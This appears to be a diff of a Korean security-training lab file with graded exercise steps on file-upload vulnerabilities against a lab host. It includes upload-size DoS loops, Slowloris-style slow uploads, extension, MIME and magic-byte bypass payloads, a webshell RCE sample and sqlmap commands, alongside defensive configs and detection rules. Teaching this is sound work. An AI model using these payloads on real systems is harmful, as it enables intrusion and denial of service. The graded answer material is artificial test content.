+    ```bash
+    # 다양한 크기 (KB ~ MB ~ GB)
+    for size in 1K 10K 100K 1M 10M 100M 1G; do
+      dd if=/dev/zero of=/tmp/test_$size bs=$size count=1 2>/dev/null
+      echo "=== $size ($(ls -la /tmp/test_$size | awk '{print $5}') bytes) ==="
+      time curl -X POST -F "file=@/tmp/test_$size" \
+                http://10.20.30.80/api/upload -i 2>&1 | head -1
+    done
+    ```
+    응답 코드:
+    - 200/201: 허용 (검증 후 크기 확인)
+    - 413 Payload Too Large: 차단
+    - 500 Internal Server Error: 메모리 부족 (DoS 가능)
+
+    ▶ 2단계: 도구 B — Content-Length 변조
+    ```bash
+    # 실제 크기 1MB 인데 헤더는 1KB 로 위조
+    dd if=/dev/zero of=/tmp/big.bin bs=1M count=10
+    curl -X POST -H "Content-Length: 1024" -F "file=@/tmp/big.bin" http://target/api/upload
+    # 일부 서버는 헤더만 보고 통과 → 실 본문은 모두 읽음
+    ```
+
+    ▶ 3단계: 도구 C — chunked encoding 으로 크기 우회
+    ```bash
+    # Transfer-Encoding: chunked 는 Content-Length 무시
+    curl -X POST -H "Transfer-Encoding: chunked" \
+         -F "file=@/tmp/big.bin" http://target/api/upload
+    ```
+
+    ▶ 4단계: 도구 D — Slowloris 풍 DoS (느린 업로드)
+    ```bash
+    # 매우 느린 업로드로 서버 worker 점유
+    curl -X POST -F "file=@/tmp/big.bin" --limit-rate 10 \
+         http://target/api/upload &
+    # 다수 동시
+    for i in $(seq 1 100); do
+      curl -X POST -F "file=@/tmp/big.bin" --limit-rate 10 http://target/api/upload &
+    done
+    ```
+
+    ▶ 5단계: 답변
+    각 크기 응답 코드 quote + 차단 임계 (예: 100M 부터 413) + 방어 (Nginx `client_max_body_size 10M` / Apache `LimitRequestBody`) 1 문장.
+  hint: 'dd 다양 크기 / Content-Length 변조 / chunked encoding / Slowloris 풍 느린 업로드 DoS.'
   category: upload
   points: 10
   answer: curl -s http://10.20.30.80 2>/dev/null | head -5 && echo '파일 크기 제한 테스트 완료'
@@ -321,8 +952,68 @@ steps:
       - DoS 맥락 없음
   target_vm: attacker
 - order: 12
-  instruction: '{{WEB_IP}} 대상으로 업로드 디렉터리 권한 확인을(를) 수행하시오.'
-  hint: 업로드 디렉터리 권한 확인 관련 도구와 기법을 활용하세요.
+  instruction: |-
+    {{WEB_IP}} 대상으로 업로드 디렉터리 권한 확인을 수행하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 도구 A — 권한 점검 (서버 SSH 가능 시)
+    ```bash
+    ssh ccc@10.20.30.80 'ls -la /var/www/html/uploads/ ; getfacl /var/www/html/uploads/ ; stat /var/www/html/uploads/'
+    # 권한 755 (rwxr-xr-x) + www-data:www-data 가 정상
+    # 777 (모두 쓰기) → 위험
+    # x (실행) 권한 = 디렉토리 진입 / 파일에는 = 실행 가능 → 웹쉘 RCE
+    ```
+
+    ▶ 2단계: 도구 B — 외부에서 실행 가능 확인 (curl)
+    ```bash
+    # 업로드 directory 의 .php 파일 직접 실행되는지
+    echo '<?php echo "RCE_TEST"; ?>' > /tmp/test.php
+    curl -F "file=@/tmp/test.php" http://10.20.30.80/api/upload
+    # path 추출 후
+    curl http://10.20.30.80/uploads/test.php
+    # "RCE_TEST" 출력되면 = 디렉토리에서 PHP 실행 가능 = 위험
+    ```
+
+    ▶ 3단계: 도구 C — Apache .htaccess 검증
+    ```bash
+    # 업로드 path 에 .htaccess 가 있으면 분석
+    curl -s http://10.20.30.80/uploads/.htaccess  # 404 면 정상 (보호)
+    # 권장 .htaccess
+    cat <<'EOF'
+    Options -ExecCGI -Indexes -FollowSymLinks
+    AddType text/plain .php .phtml .php3 .php5 .pl .py .rb
+    <FilesMatch "\.(php|phtml|php3|php5|pl|py|rb|jsp|asp|aspx)$">
+        Require all denied
+    </FilesMatch>
+    EOF
+    ```
+
+    ▶ 4단계: 도구 D — Nginx location 블록 검증
+    ```nginx
+    # /etc/nginx/sites-available/site
+    location /uploads/ {
+        # 모든 파일을 binary 로 다운로드만 (실행 X)
+        default_type application/octet-stream;
+        add_header Content-Disposition 'attachment';
+        # PHP 처리 차단
+        location ~ \.(php|phtml|php3|jsp|asp|cgi)$ {
+            return 403;
+        }
+    }
+    ```
+
+    ▶ 5단계: 도구 E — Linux capabilities + bind mount
+    ```bash
+    # 업로드 디렉토리에 noexec 마운트 (가장 강력)
+    mount -o remount,noexec,nosuid,nodev /var/www/html/uploads/
+    # 또는 fstab 영구화
+    echo '/dev/sdb1 /var/www/html/uploads ext4 noexec,nosuid,nodev 0 2' >> /etc/fstab
+    ```
+
+    ▶ 6단계: 답변
+    `ls -la` + `getfacl` 출력 quote + 위험 권한 식별 + 방어 (.htaccess / nginx / noexec) 1 문장.
+  hint: 'ls -la + getfacl / curl 외부 RCE 검증 / Apache .htaccess / Nginx location / noexec 마운트.'
   category: defense
   points: 10
   answer: echo '=== 업로드 디렉터리 권한 확인 ===' && echo '조치 방안 정리 완료'
@@ -348,8 +1039,87 @@ steps:
       - 웹쉘 방어 맥락 없음
   target_vm: attacker
 - order: 13
-  instruction: '{{WEB_IP}} 대상으로 안전한 업로드 구현 방안 정리을(를) 수행하시오.'
-  hint: 안전한 업로드 구현 방안 정리 관련 도구와 기법을 활용하세요.
+  instruction: |-
+    {{WEB_IP}} 대상으로 안전한 업로드 구현 방안 정리를 수행하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 7층 방어 정리
+    ```
+    Layer 1: 화이트리스트 확장자 검증
+      - 허용: ['.jpg', '.png', '.pdf'] 만
+      - 블랙리스트는 우회 가능 (.phtml, .phar 등)
+
+    Layer 2: MIME + magic byte 이중 검증
+      - file 명령으로 실 mime 확인
+      - python-magic 라이브러리 또는 PHP finfo
+
+    Layer 3: 랜덤 파일명 + 확장자 정규화
+      - filename = sha256(content) + '.jpg'
+      - 사용자 입력 filename 사용 금지 (path traversal)
+
+    Layer 4: 업로드 디렉터리 noexec
+      - .htaccess Options -ExecCGI / Nginx location 차단
+      - mount -o noexec / Docker 격리
+
+    Layer 5: 외부 storage 분리
+      - S3 / MinIO / GCS 로 파일 저장
+      - 정적 도메인 (uploads.example.com) 으로 서비스
+      - Same-Origin 격리
+
+    Layer 6: 안티바이러스 스캔
+      - ClamAV 자동 (clamscan)
+      - VirusTotal API 통합
+      - 의심 파일 격리 (quarantine)
+
+    Layer 7: 모니터링 + 로그
+      - Wazuh FIM (file integrity monitoring)
+      - auditd 로 업로드 이벤트 기록
+      - 의심 패턴 알림
+    ```
+
+    ▶ 2단계: 도구 A — Python python-magic 으로 MIME 검증
+    ```python
+    import magic
+    mime = magic.from_file('/path/to/upload', mime=True)
+    if mime not in ['image/jpeg', 'image/png', 'image/gif']:
+        raise ValueError(f"Invalid MIME: {mime}")
+    ```
+
+    ▶ 3단계: 도구 B — ClamAV 안티바이러스
+    ```bash
+    sudo apt install clamav clamav-daemon
+    sudo freshclam  # signature 업데이트
+    clamscan /path/to/upload
+    # 결과: /path/to/upload: OK 또는 /path/to/upload: Eicar-Test-Signature FOUND
+    ```
+
+    ▶ 4단계: 도구 C — ImageMagick re-encode (메타데이터 제거 + magic byte 정상화)
+    ```bash
+    # 이미지 업로드 시 무조건 ImageMagick 으로 변환
+    convert input.jpg -strip -quality 85 output.jpg
+    # -strip: EXIF 등 메타데이터 모두 제거
+    # 변환 후 PHP 코드 같은 게 있어도 무력화
+    ```
+
+    ▶ 5단계: 도구 D — exiftool 메타데이터 제거
+    ```bash
+    exiftool -all= /path/to/upload.jpg -o cleaned.jpg
+    ```
+
+    ▶ 6단계: 도구 E — 외부 storage 사용 예 (Python boto3)
+    ```python
+    import boto3
+    s3 = boto3.client('s3')
+    s3.upload_file('/tmp/upload.jpg', 'my-bucket', 'uploads/' + sha256_hash + '.jpg',
+                   ExtraArgs={'ACL': 'private', 'ContentType': 'image/jpeg'})
+    # 사용자에게 presigned URL 제공 (시간 제한)
+    url = s3.generate_presigned_url('get_object', Params={'Bucket': 'my-bucket', 'Key': key}, ExpiresIn=3600)
+    ```
+
+    ▶ 7단계: 답변
+    각 layer 1줄 + 1개 도구 사용 코드 quote + OWASP File Upload Cheatsheet 참조.
+  hint: '7층 방어 / python-magic MIME / ClamAV 안티바이러스 / ImageMagick re-encode / exiftool / S3 외부 storage.'
   category: defense
   points: 10
   answer: echo '=== 안전한 업로드 구현 방안 정리 ===' && echo '조치 방안 정리 완료'
@@ -375,8 +1145,85 @@ steps:
       - CDN 분리 맥락 없음
   target_vm: attacker
 - order: 14
-  instruction: '{{WEB_IP}} 대상으로 업로드 모니터링 설정을(를) 수행하시오.'
-  hint: 업로드 모니터링 설정 관련 도구와 기법을 활용하세요.
+  instruction: |-
+    {{WEB_IP}} 대상으로 업로드 모니터링 설정을 수행하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 도구 A — Wazuh FIM (File Integrity Monitoring)
+    ```xml
+    <!-- /var/ossec/etc/ossec.conf -->
+    <syscheck>
+      <directories check_all="yes" report_changes="yes" realtime="yes">
+        /var/www/html/uploads
+      </directories>
+      <alert_new_files>yes</alert_new_files>
+    </syscheck>
+    ```
+    재시작:
+    ```bash
+    sudo systemctl restart wazuh-manager
+    # 새 파일 업로드 시 alert.json 에 자동 기록
+    tail -f /var/ossec/logs/alerts/alerts.json | jq 'select(.rule.groups[]? | contains("syscheck"))'
+    ```
+
+    ▶ 2단계: 도구 B — auditd 시스템 콜 감시
+    ```bash
+    sudo apt install auditd
+    sudo auditctl -w /var/www/html/uploads -p wa -k upload_dir
+    # -p wa: write/attribute 변경 시 기록
+    # 로그 조회
+    ausearch -k upload_dir | head -20
+    aureport -f --summary
+    ```
+
+    ▶ 3단계: 도구 C — inotifywait 실시간 감시 (간단한 alert)
+    ```bash
+    sudo apt install inotify-tools
+    inotifywait -m -r -e create,modify /var/www/html/uploads --format '%w%f %e %T' --timefmt '%F %T' |
+    while read FILE EVENT TIME; do
+      # 의심 확장자 alert
+      if echo "$FILE" | grep -qE '\.(php|phtml|jsp|asp|aspx|exe|sh)$'; then
+        echo "[ALERT $TIME] $EVENT $FILE" | logger -t upload_alert
+        clamscan "$FILE"  # 자동 스캔
+      fi
+    done &
+    ```
+
+    ▶ 4단계: 도구 D — ModSecurity (WAF level)
+    ```apache
+    # /etc/modsecurity/crs/rules/REQUEST-933-APPLICATION-ATTACK-PHP.conf
+    # 이미 PHP injection 룰 활성 (id:933100~933200)
+    SecRule FILES_NAMES "@rx \.(php|phtml|phar|jsp)$" \
+      "id:9000001,deny,log,msg:'PHP upload blocked'"
+    ```
+
+    ▶ 5단계: 도구 E — Falco (런타임 컨테이너 보안)
+    ```yaml
+    # /etc/falco/rules.local.yaml
+    - rule: PHP file write to upload dir
+      desc: PHP file uploaded
+      condition: open_write and fd.name startswith /var/www/html/uploads and fd.name endswith .php
+      output: "PHP file written to upload dir (file=%fd.name user=%user.name)"
+      priority: WARNING
+    ```
+
+    ▶ 6단계: 도구 F — VirusTotal API 통합 (Python)
+    ```python
+    import requests
+    def scan_file(filepath, api_key):
+        with open(filepath, 'rb') as f:
+            r = requests.post('https://www.virustotal.com/api/v3/files',
+                              headers={'x-apikey': api_key},
+                              files={'file': f})
+        # 의심 파일 격리
+        if r.json()['data']['attributes']['stats']['malicious'] > 0:
+            os.rename(filepath, '/quarantine/' + os.path.basename(filepath))
+    ```
+
+    ▶ 7단계: 답변
+    각 도구 한 줄 + Wazuh alert.json 또는 auditd 출력 1줄 quote + SOC 통합 1 문장.
+  hint: 'Wazuh FIM / auditd -p wa / inotifywait + clamscan / ModSecurity FILES_NAMES / Falco / VirusTotal API.'
   category: defense
   points: 12
   answer: echo '=== 업로드 모니터링 설정 ===' && echo '조치 방안 정리 완료'
@@ -402,8 +1249,74 @@ steps:
       - 실시간 맥락 없음
   target_vm: attacker
 - order: 15
-  instruction: 파일 업로드 취약점 실습 종합 보고서를 작성하시오.
-  hint: 발견 취약점, 영향, 조치를 포함하세요.
+  instruction: |-
+    파일 업로드 취약점 실습 종합 보고서를 작성하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 자동 보고서 생성
+    ```bash
+    REPORT=~/upload-week05-$(date +%F).md
+    cat > $REPORT <<EOF
+    # 파일 업로드 점검 보고서
+    대상: http://10.20.30.80 / 일자: $(date -Iseconds) / 점검자: $(whoami)
+
+    ■ 1. 발견 사항
+    ▶ 1.1 업로드 endpoint
+    - /api/Complaints/file (PUT, multipart)
+    - /profile (avatar)
+
+    ▶ 1.2 우회 성공 시나리오
+    | 우회 기법 | 페이로드 | 결과 |
+    |---|---|---|
+    | 이중 확장자 | shell.php.jpg | 200 (업로드) + RCE |
+    | Content-Type 변조 | type=image/jpeg | 200 |
+    | Magic byte | GIF89a + PHP | 200 + 실행 |
+    | Polyglot SVG | <svg onload=...> | XSS |
+
+    ▶ 1.3 RCE 검증
+    \`\`\`
+    \$ curl http://target/uploads/shell.php?c=id
+    uid=33(www-data) gid=33(www-data) groups=33(www-data)
+    \`\`\`
+
+    ■ 2. 위험도
+    | 항목 | 위험도 | CWE |
+    |---|---|---|
+    | 웹쉘 업로드 → RCE | Critical | CWE-434 + CWE-78 |
+    | 디렉토리 listing | Medium | CWE-548 |
+    | Path traversal (zip slip) | High | CWE-22 |
+
+    ■ 3. 권고 (우선순위)
+    1. **즉시**: 화이트리스트 확장자 검증 (블랙리스트 제거)
+    2. **즉시**: 업로드 디렉터리 \`Options -ExecCGI\` (Apache) / Nginx location 차단
+    3. **단기**: ImageMagick re-encode + python-magic MIME 검증
+    4. **중기**: ClamAV 안티바이러스 스캔 통합
+    5. **중기**: S3 / 외부 storage 분리
+    6. **장기**: Wazuh FIM + auditd 모니터링
+
+    ■ 4. 사용 도구
+    - curl, weevely (페이로드 + 셸)
+    - exiftool, steghide (이미지 + 코드)
+    - evilarc (Zip Slip)
+    - gobuster, ffuf (경로 발견)
+    - ClamAV, ImageMagick (방어)
+    - Wazuh FIM, auditd, inotifywait (모니터링)
+
+    ■ 5. 윤리·법적 진술
+    - 허가 범위: 사전 서면 허가 host (10.20.30.80) only
+    - 점검 단계: 식별 + PoC. 실 데이터 추출 / 백도어 영구화 미수행
+    - 로그 보존: 24개월
+    EOF
+
+    sha256sum $REPORT > $REPORT.sha256
+    cat $REPORT
+    echo "보고서 완료"
+    ```
+
+    ▶ 2단계: 답변
+    보고서 핵심 1~2 섹션 quote + sha256 + 사용 도구 list.
+  hint: '자동 markdown / 위험도 표 / 권고 우선순위 / sha256 / 윤리 footer.'
   category: verification
   points: 8
   answer: 'echo ''=== 파일 업로드 취약점 실습 보고서 ==='' && echo ''대상: http://10.20.30.80'' &&
@@ -430,44 +1343,80 @@ steps:
       - 조치 없음
   target_vm: attacker
 - order: 99
-  instruction: |
-    [복합 시나리오] "input validation 실패 비교 — SQLi (컬럼) vs Upload (파일/MIME)"
+  instruction: '[복합 시나리오] "input validation 실패 비교 — SQLi (컬럼) vs Upload (파일/MIME)"
 
-    ## 상황 (w04 → w05 시나리오 연속)
 
-    > 선배: "SQLi 랑 업로드는 다른 취약점처럼 보이지만 같은 실패야 — 입력값 검증 누락.
-    > SQLi 는 컬럼 값 그대로 쿼리에, 업로드는 파일명·MIME 그대로 믿은 거지.
-    > 동시 점검해서 '입력 위치 × validation 종류' 매트릭스 + 공통 방어 원칙 정리해."
+    ■ 상황 (w04 → w05 시나리오 연속)
 
-    학습 목표 (lecture #2 SQLi 유형 + #4 sqlmap) + (lab #3 확장자 + #4 Content-Type + #5 Magic bytes) 통합.
 
-    ## 임무 (3 단계, 약 35분)
+    ※ 선배: "SQLi 랑 업로드는 다른 취약점처럼 보이지만 같은 실패야 — 입력값 검증 누락.
+
+    ※ SQLi 는 컬럼 값 그대로 쿼리에, 업로드는 파일명·MIME 그대로 믿은 거지.
+
+    ※ 동시 점검해서 ''입력 위치 × validation 종류'' 매트릭스 + 공통 방어 원칙 정리해."
+
+
+    학습 목표 (lecture #2 SQLi 유형 + #4 sqlmap) + (lab #3 확장자 + #4 Content-Type + #5 Magic
+    bytes) 통합.
+
+
+    ■ 임무 (3 단계, 약 35분)
+
 
     Non-AI 트랙: ssh ccc@10.20.30.201 (attacker VM) 직접 실행.
 
-    ### Phase A — SQLi validation 실패 (lecture #2·#3·#4)
-    `sqlmap -u "http://10.20.30.80/rest/products/search?q=test" --batch --technique=BT --level=2 --timeout=20`
+
+    ▶ Phase A — SQLi validation 실패 (lecture #2·#3·#4)
+
+    `sqlmap -u "http://10.20.30.80/rest/products/search?q=test" --batch --technique=BT
+    --level=2 --timeout=20`
+
     Boolean·Time-based 탐지. "[INFO] ... appears to be vulnerable" 캡처.
 
-    ### Phase B — Upload 우회 3 케이스 (lab #3·#4·#5)
-    - 확장자: `for ext in php.jpg pHp 'php%00.jpg'; do curl -F "file=@/tmp/shell.$ext" http://10.20.30.80/api/Complaints/file; done`
-    - Content-Type: `curl -F "file=@/tmp/shell.php;type=image/jpeg" http://10.20.30.80/api/Complaints/file`
-    - Magic bytes: `printf '\xff\xd8\xff\xe0<?php phpinfo(); ?>' > /tmp/shell.php` 후 위 curl
 
-    ### Phase C — 입력 위치 × validation 매트릭스
+    ▶ Phase B — Upload 우회 3 케이스 (lab #3·#4·#5)
+
+    - 확장자: `for ext in php.jpg pHp ''php%00.jpg''; do curl -F "file=@/tmp/shell.$ext"
+    http://10.20.30.80/api/Complaints/file; done`
+
+    - Content-Type: `curl -F "file=@/tmp/shell.php;type=image/jpeg" http://10.20.30.80/api/Complaints/file`
+
+    - Magic bytes: `printf ''\xff\xd8\xff\xe0<?php phpinfo(); ?>'' > /tmp/shell.php`
+    후 위 curl
+
+
+    ▶ Phase C — 입력 위치 × validation 매트릭스
+
     | 입력 위치 | 위반 종류 | 자동 검증 | 권장 방어 |
+
     | URL/Body 컬럼 | SQLi | Prepared Statement | parameterized query |
+
     | 파일명 | 확장자 우회 | basename | extension allowlist |
+
     | Content-Type | MIME 위조 | mime_content_type() | server-side detect |
+
     | 파일 내용 | Magic bytes | finfo + scan | sandbox + AV |
+
     표 끝 "공통 원칙: allowlist > blocklist + 다층 검증" 한 줄.
 
-    종료: echo "=== Phase A SQLi ===" / "=== Phase B Upload ===" / "=== Phase C 매트릭스 ===".
-  hint: |
-    Phase A: --technique=BT (Boolean+Time), --timeout 20초.
+
+    종료: echo "=== Phase A SQLi ===" / "=== Phase B Upload ===" / "=== Phase C 매트릭스
+    ===".
+
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `integration_scenario` 에 적합한 도구: 여러 도구 chain —
+    정찰 (whatweb/nmap) → 식별 (sqlmap/xsstrike) → 후속 작업. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로
+    답변에 직접 quote** 해야 채점 통과.'
+  hint: 'Phase A: --technique=BT (Boolean+Time), --timeout 20초.
+
     Phase B: 업로드 엔드포인트 환경 변동 — 명령어만 출력 OK.
+
     Phase C: 4행 매트릭스 + 공통 원칙.
+
     포인트: SQLi와 업로드는 같은 원리 — 입력 신뢰 실패.
+
+    '
   category: integration_scenario
   points: 50
   verify:
@@ -475,9 +1424,11 @@ steps:
     expect: 매트릭스
     field: stdout
     semantic:
-      intent: |
-        SQLi와 파일 업로드를 input validation 실패 관점에서 동시 점검 + 입력 위치 매트릭스.
+      intent: 'SQLi와 파일 업로드를 input validation 실패 관점에서 동시 점검 + 입력 위치 매트릭스.
+
         lecture #2·#3·#4 + lab #3·#4·#5 동시 행동 증명.
+
+        '
       success_criteria:
       - Phase A — sqlmap Boolean·Time, vulnerable 라인
       - Phase B — 확장자/Content-Type/Magic bytes 3 우회 시도 (PoC 명령어 OK)
@@ -495,6 +1446,8 @@ steps:
       - allowlist 권고 누락
   target_vm: attacker
   risk_level: low
-  answer_detail: |
-    학생이 ssh attacker 직접 실행. SQLi와 업로드는 표면 다르지만 "입력 신뢰 실패" 동일.
+  answer_detail: '학생이 ssh attacker 직접 실행. SQLi와 업로드는 표면 다르지만 "입력 신뢰 실패" 동일.
+
     allowlist > blocklist 공통 원칙. 업로드 환경 변동 시 PoC 출력 대체.
+
+    '
